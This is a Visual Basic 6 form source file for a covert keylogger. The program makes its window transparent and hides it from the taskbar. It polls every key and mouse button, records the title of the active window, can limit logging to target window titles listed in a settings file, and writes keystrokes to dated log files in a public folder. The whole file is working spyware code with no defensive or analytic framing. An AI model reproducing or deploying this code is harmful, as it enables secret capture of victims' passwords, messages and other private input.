VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   ClientHeight    =   195
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   195
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   13
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   13
   ShowInTaskbar   =   0   'False
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   60
      Left            =   3840
      Top             =   960
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   450
      Left            =   3120
      Top             =   600
   End
   Begin VB.TextBox Text2 
      Enabled         =   0   'False
      Height          =   285
      Left            =   840
      Locked          =   -1  'True
      TabIndex        =   1
      Top             =   120
      Width           =   2775
   End
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      Height          =   1935
      Left            =   720
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   480
      Width           =   3735
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

'Special Folder path Import
Public Enum mceIDLPaths
    CSIDL_APPDATA = &H1B ' C:\WINNT\Profiles\username\Application Data.
    CSIDL_PROGDATA = &H23
    CSIDL_WINDOWS = &H24 ' C:\WINNT.
End Enum
Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hwnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean

'Active windowtitle part
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long

'keylogger part
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer 'caps keystate

Dim SettingsPath As String
'Loadsetting variable declaration
Dim LPath, LogFile, CompName As String
'array to hold target titles
Dim title() As String
'if title file not fund then Log every title
Dim LogAll As Boolean

'Prevent only Titles in LOG
Dim HasSomeText As Boolean 'Log wil not recorded if HasSomeText=False

Private Sub Form_Load()
If App.PrevInstance = True Then
'    Shell (GetSpecialFolderA(CSIDL_WINDOWS) & "explorer.exe"), vbNormalFocus 'This program is already running!
    End
    Exit Sub
End If

TransparentForm Me                  ''Rather than me.hide its better to become transparent.
SettingsPath = GetSpecialFolderA(CSIDL_PROGDATA) & "System\"  ' "C:\ProgramData\"
App.TaskVisible = False

Call LoadSetting
Call LoadTitles
Call startLogging
Timer2.Enabled = True
End Sub

Private Sub LoadSetting()
Dim defaultPath As String

If Dir(SettingsPath & "settings.txt") <> "" Then 'setting file found then
    Open (SettingsPath & "settings.txt") For Input As 1
    Input #1, LPath, CompName
    Close #1
    LPath = LPath & "\"
Else    'setting not found
    'Use default settings
    'LPath = GetSpecialFolderA(CSIDL_PROGDATA) & "NLogs\"
    LPath = "C:\Users\Public\Libraries\NLogs\"      'Because All users can access this folder
    CompName = "SYSTEM"
End If

If FolderExists(LPath) = False Then MkDir LPath
'If Path is from Username root use u:
If Left(LPath, 2) = "u:" Then LPath = Environ$("USERPROFILE") & Mid(LPath, 3, Len(LPath) - 2)

End Sub
Private Sub LoadTitles()
Dim t1 As String, TitlesCount, i As Integer

If Dir(SettingsPath & "titles.txt") <> "" Then 'title file found then

TitlesCount = 0
    Open (SettingsPath & "titles.txt") For Input As 1
    While Not EOF(1)
        Line Input #1, t1
        If Trim$(t1) <> "" Then TitlesCount = TitlesCount + 1
    Wend
    Close #1

If TitlesCount = 0 Then LogAll = True: Exit Sub
'Now we have Titles Count, inititlise array
ReDim title(TitlesCount - 1)
LogAll = False  'log selected titles only not all
'Now fill the array
i = 0
    Open (SettingsPath & "titles.txt") For Input As 2
    While Not EOF(2)
        Line Input #2, t1
        If Trim$(t1) <> "" Then title(i) = t1: i = i + 1
    Wend
    Close #2
Else
'if titles file not found continue with logging all
LogAll = True
End If

End Sub

Private Sub startLogging()

LogFile = LPath & Format$(Now, "dd" & "mm" & "yy") & ".nkl"

If Dir(LogFile) = "" Then     'If file not exist
'Write initials
Open LogFile For Append As 1
    Write #1, Chr(155), Time, Date, CompName, App.Revision
Close #1
End If

End Sub

Private Sub Timer1_Timer()
Dim i As Integer
Dim Result As Integer
For i = 1 To 255
 Result = GetAsyncKeyState(i)
If Result = -32767 Then
    
    If (i >= 65 And i <= 90) Or i = 32 Then         'alphabets 32 for space bar
        Text1.Text = Text1.Text + CorrectCase(i)
        HasSomeText = True  'Something is typed
    Else                                            'non alphabets
        If i = 1 Then                               'it is Click
        Text1.Text = Text1.Text & "[C]"             'Print [C] to show click
        ElseIf i = 8 Then                           'Key pressed is Backspace
               ' delete last letter becoz Backspace pressed
                If Len(Text1) > 0 And Right(Text1.Text, 1) <> "]" And Right(Text1.Text, 1) <> Chr(13) Then Text1.Text = Left(Text1.Text, Len(Text1) - 1)
        Else
            Text1.Text = Text1.Text + CheckShift(i)
        End If
    End If

End If
Next i
End Sub

'If ActiveWindow Title changes then Records text from text box to file
Private Sub Text2_Change()

If HasSomeText = True Then
    If Trim(Text1.Text) <> "" Then Call Appendnow
End If

HasSomeText = False

If TitleMatches(Text2.Text) = True Then
    Text1.Text = Time & ": " & Text2.Text & vbCrLf
    Timer1.Enabled = True
Else
    Timer1.Enabled = False
End If
End Sub
Private Function TitleMatches(ByVal cTitle As String) As Boolean
'If title array is blank / logall=true return true
If LogAll = True Then TitleMatches = True: Exit Function

'If nothing in title then faLSE
If Trim(cTitle) = "" Then TitleMatches = False: Exit Function

Dim i As Integer, temp As String
For i = 0 To UBound(title)
    temp = Trim(LCase(title(i)))
    If LCase(Left(cTitle, Len(temp))) = temp Then TitleMatches = True: Exit Function
Next
TitleMatches = False
End Function
'************************encrypting and Recording to file use of Append*********
Private Sub Appendnow()

NowSave:
If Dir(LogFile) <> "" Then
    Open LogFile For Append As #1
        Print #1, Text1.Text
        Text1.Text = ""
    Close #1
Else
    'msgbox "File access error"
    Call startLogging       'Again write initials
    GoTo NowSave            'And Store this text
End If

End Sub
'***********************


'******************KEYCASEPART***********
Function CorrectCase(ByVal b As Integer) As String
Dim tmp As Boolean
tmp = GetKeyState(vbKeyCapital)
If tmp = 1 Then         'The Caps Lock Is On
    If GetAsyncKeyState(vbKeyShift) Then      'shift key down now
    CorrectCase = LCase(Chr(b)) 'print small letter
    Else
    CorrectCase = UCase(Chr(b)) 'print capital letter
    End If
Else            'The Caps Lock Is Off
    If GetAsyncKeyState(vbKeyShift) Then      'shift key down now
    CorrectCase = UCase(Chr(b)) 'print capital letter
    Else
    CorrectCase = LCase(Chr(b)) 'print small letter
    End If
End If
End Function

'''**********************shiftkey****************
Private Function CheckShift(ByVal b As Integer) As String
    If GetAsyncKeyState(vbKeyShift) Then
       CheckShift = shiftkeydw(b)
    Else
        CheckShift = shiftkeyup(b)
    End If
End Function
'''**********************finding symbol and number keys when shift key unpressed**********
Private Function shiftkeyup(ByVal b As Integer) As String
Select Case b
Case 48 To 57  'number keys above QWERTY
    shiftkeyup = b - 48
Case 96 To 105  'Number keys from numpad
    shiftkeyup = b - 96
Case 192
    shiftkeyup = "`"
Case 189
    shiftkeyup = "-"
Case 187
    shiftkeyup = "="
Case 219
    shiftkeyup = "["
Case 186
    shiftkeyup = ";"
Case 222
    shiftkeyup = "'"
Case 221
    shiftkeyup = "]"
Case 188
    shiftkeyup = ","
Case 190
    shiftkeyup = "."
Case 191
    shiftkeyup = "/"
Case 220
    shiftkeyup = "\"
Case 111
    shiftkeyup = "/"
Case 106
    shiftkeyup = "*"
Case 109
    shiftkeyup = "-"
Case 107
    shiftkeyup = "+"
Case 110
    shiftkeyup = "."


Case Else           'If key doesnt recognised ascii code will be displayed
    shiftkeyup = locatekey(b)
End Select
End Function
'''**********************finding symbol and number keys when shift key unpressed**********
Private Function shiftkeydw(ByVal b As Integer) As String
Select Case b
Case 48 'number keys above QWERTY
    shiftkeydw = ")"
Case 49
    shiftkeydw = "!"
Case 50
    shiftkeydw = "@"
Case 51
    shiftkeydw = "#"
Case 52
    shiftkeydw = "$"
Case 53
    shiftkeydw = "%"
Case 54
    shiftkeydw = "^"
Case 55
    shiftkeydw = "&"
Case 56
    shiftkeydw = "*"
Case 57
    shiftkeydw = "("

Case 96 To 105  'Number keys from numpad
    shiftkeydw = b - 96

Case 192
    shiftkeydw = "~"
Case 189
    shiftkeydw = "_"
Case 187
    shiftkeydw = "+"
Case 219
    shiftkeydw = "{"
Case 186
    shiftkeydw = ":"
Case 222
    shiftkeydw = """"
Case 221
    shiftkeydw = "}"
Case 188
    shiftkeydw = "<"
Case 190
    shiftkeydw = ">"
Case 191
    shiftkeydw = "?"
Case 220
    shiftkeydw = "|"
Case 111
    shiftkeydw = "/"
Case 106
    shiftkeydw = "*"
Case 109
    shiftkeydw = "-"
Case 107
    shiftkeydw = "+"


Case Else           'If key is not symbol then locate its name
    shiftkeydw = locatekey(b)
End Select

End Function
Private Function locatekey(ByVal b As Integer) As String

Select Case b
Case 27
    locatekey = "[ESC]"
Case 9
    locatekey = "[TAB]"
Case 20
    locatekey = "[CAPS]"
Case 16         'shift key
    locatekey = ""
Case 160        'Left shift key
    locatekey = ""
Case 161        'Right shift key
    locatekey = ""
Case 112 To 123
    locatekey = "[F" & b - 111 & "]"
Case 13
    locatekey = "[ENTR]"
Case 91
    locatekey = "[LWND]"
Case 92
    locatekey = "[RWND]"
Case 18            'alt KEY DEFECT
    locatekey = ""
Case 164
    locatekey = "[LALT]"
Case 165
    locatekey = "[RALT]"
    
Case 17         'Ctrl key defect
    locatekey = ""
Case 162
    locatekey = "[LCTRL]"
Case 163
    locatekey = "[RCTRL]"

Case 2
    locatekey = "[RC]"
Case 93
    locatekey = "[KRC]"
'Case 8
 '   locatekey = "[BS]"
Case 46
    locatekey = "[DEL]"
Case 45
    locatekey = "[INS]"
Case 36
    locatekey = "[HOME]"
Case 33
    locatekey = "[PAGEUP]"
Case 35
    locatekey = "[END]"
Case 34
    locatekey = "[PAGEDOWN]"
Case 37
    locatekey = "[LEFT]"
Case 38
    locatekey = "[UP]"
Case 39
    locatekey = "[RIGHT]"
Case 40
    locatekey = "[DOWN]"
Case 44
    locatekey = "[PRINTSCREEN]"
Case 145
    locatekey = "[SCRLCK]"
Case 19
    locatekey = "[PAUSE/BREAK]"
Case 144
    locatekey = "[NUMLCK]"
Case 12
    locatekey = "[5]"



Case Else
    locatekey = "[" & b & "]"
End Select
End Function


'*************Imports active w title***********
Private Sub Timer2_Timer()
Text2.Text = GetActiveWindowTitle(False)            'Get window title after 550 interval
End Sub


' ************************************Ativewindow title part******************************
' if GetParent = true then the parent window is returned.
Public Function GetActiveWindowTitle(ByVal ReturnParent As Boolean) As String
Dim i As Long
Dim j As Long

i = GetForegroundWindow


If ReturnParent Then
Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j
End If

GetActiveWindowTitle = GetWindowTitle(i)
End Function
Public Function GetWindowTitle(ByVal hwnd As Long) As String
Dim l As Long
Dim S As String

l = GetWindowTextLength(hwnd)
S = Space(l + 1)

GetWindowText hwnd, S, l + 1

GetWindowTitle = Left$(S, l)
End Function

'IMPORT Special folder Path
Public Function GetSpecialFolderA(ByVal eSpecialFolder As mceIDLPaths) As String

Dim Ret As Long
Dim Trash As String: Trash = Space$(260)

    Ret = SHGetSpecialFolderPath(0, Trash, eSpecialFolder, False)
    If Trim$(Trash) <> Chr(0) Then Trash = Left$(Trash, InStr(Trash, Chr(0)) - 1) & "\"
  
    GetSpecialFolderA = Trash
End Function
Function FolderExists(ByVal sPath As String) As Boolean
    '-- sPath may or may not end with "\"
    '-- vbDirectory + vbHidden + vbSystem + vbReadOnly = 16 + 4 + 2 + 1 = 23
    If Dir$(sPath, 23) <> "" Then
        If (GetAttr(sPath) And vbDirectory) = vbDirectory Then
            FolderExists = True
        Else
            FolderExists = False
            '-- sPath exists but it is not a folder
        End If
    Else
        FolderExists = False
        '-- sPath does not exist
    End If
End Function
